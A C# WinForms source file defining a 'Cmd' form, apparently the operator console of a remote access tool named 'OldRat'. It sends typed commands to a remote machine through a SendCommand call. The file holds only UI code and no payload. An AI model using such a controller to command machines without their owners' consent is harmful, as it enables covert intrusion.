using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OldRat.server
{
    public class Cmd : Form
    {
        private Main main;

        private Panel panel;
        private TextBox input;
        private Label terminal;

        public string TerminalText {  get { return terminal.Text; } set { terminal.Text = value; } }


        public Cmd(Main mainForm)
        {
            main = mainForm;
            InitializeComponent();
            Init();
        }

        private void Init()
        {
            input.KeyDown += Input_KeyDown;
        }

        private void Input_KeyDown(object sender, KeyEventArgs e)
        {

            if (e.KeyCode == Keys.Enter)  // Vérifie si la touche pressée est Enter
            {
                if (main.SendCommand(input.Text.Trim()))
                {
                    input.Text = "";
                    e.SuppressKeyPress = true; //suprime le bip
                }
                else
                {
                    terminal.Text += "Un probleme est survenu lors de l'envoie de la command.\n";
                }
            }
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.panel = new System.Windows.Forms.Panel();
            this.terminal = new System.Windows.Forms.Label();
            this.input = new System.Windows.Forms.TextBox();
            this.panel.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel
            // 
            this.panel.AutoScroll = true;
            this.panel.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
            this.panel.Controls.Add(this.terminal);
            this.panel.Dock = System.Windows.Forms.DockStyle.Fill;
            this.panel.ForeColor = System.Drawing.SystemColors.Control;
            this.panel.Location = new System.Drawing.Point(0, 0);
            this.panel.Name = "panel";
            this.panel.Size = new System.Drawing.Size(800, 450);
            this.panel.TabIndex = 0;
            // 
            // terminal
            // 
            this.terminal.AutoSize = true;
            this.terminal.Location = new System.Drawing.Point(0, 0);
            this.terminal.Name = "terminal";
            this.terminal.Size = new System.Drawing.Size(94, 25);
            this.terminal.TabIndex = 0;
            this.terminal.Text = "terminal:\n";
            // 
            // input
            // 
            this.input.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.input.Location = new System.Drawing.Point(0, 419);
            this.input.Name = "input";
            this.input.Size = new System.Drawing.Size(800, 31);
            this.input.TabIndex = 1;
            // 
            // Cmd
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.panel);
            this.Controls.Add(this.input);
            this.Name = "Cmd";
            this.Text = "cmd";
            this.panel.ResumeLayout(false);
            this.panel.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

    }
}
